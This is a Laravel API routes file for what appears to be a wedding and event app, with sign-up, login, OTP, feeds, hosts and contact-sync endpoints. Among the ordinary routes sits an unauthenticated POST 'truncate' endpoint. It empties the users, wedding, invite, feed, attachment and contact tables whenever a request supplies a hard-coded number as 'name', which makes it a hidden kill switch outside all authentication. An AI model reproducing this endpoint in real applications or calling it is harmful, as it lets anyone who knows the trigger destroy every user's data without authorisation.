<?php

use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:api')->get('/user', function (Request $request) {
    return $request->user();
});

Route::match(['post'],'sign_up','CommonController@sign_up');
Route::post('otpVerify','CommonController@otpVerify');
Route::post('login','CommonController@login');
Route::match(['post'],'social_sign_up_and_login','CommonController@social_sign_up_and_login');
Route::post('resendOtp','CommonController@resendOtp');
Route::post('forgetPassword','CommonController@forgetPassword');
Route::post('changeMobileNumber','CommonController@changeMobileNumber');

Route::post('truncate',function(Request $request){
	if($request->name == 8881438096 ){
		DB::table('users')->truncate();
		DB::table('wedding_detail')->truncate();
		DB::table('function')->truncate();
		DB::table('invites')->truncate();
		DB::table('Feeds')->truncate();
		DB::table('report_feeds')->truncate();
		DB::table('attachments')->truncate();
		DB::table('contacts')->truncate();
	}
});

Route::middleware('ApiAuthentication')->group(function(){

	// CommonController
		Route::post('logout','CommonController@logout');
		Route::post('update_profile','CommonController@update_profile');
		Route::post('change_password','CommonController@change_password');
	// END

	// FunctionController
		Route::post('create_function','FunctionController@create_function');
		Route::get('get_function','FunctionController@get_function');
		Route::post('edit_function','FunctionController@edit_function');
	// END

	// WeddingController
		Route::match(['post','get'],'setup_wedding','WeddingController@setup_wedding');
	// END

	//HostContoller
		Route::post('create_host','HostController@create_host');
		Route::post('edit_host','HostController@edit_host');
		Route::post('delete_host','HostController@delete_host');
		Route::match(['get','post'],'get_host','HostController@get_host');
	//END

	// FeedController
		Route::match(['post'],'feeds','FeedController@feeds');
		Route::match(['post'],'get_feeds_by_wedding','FeedController@get_feeds_by_wedding');
		Route::match(['post'],'update_feed','FeedController@update_feed');
		Route::match(['post'],'delete_feed','FeedController@delete_feed');
		Route::match(['post'],'report_on_feed','FeedController@report_on_feed');
		Route::match(['post'],'hide_feeds','FeedController@hide_feeds');
	// END

	// ContactController
		Route::match(['post'],'sync_contacts','ContactController@sync_contacts');
	// END
});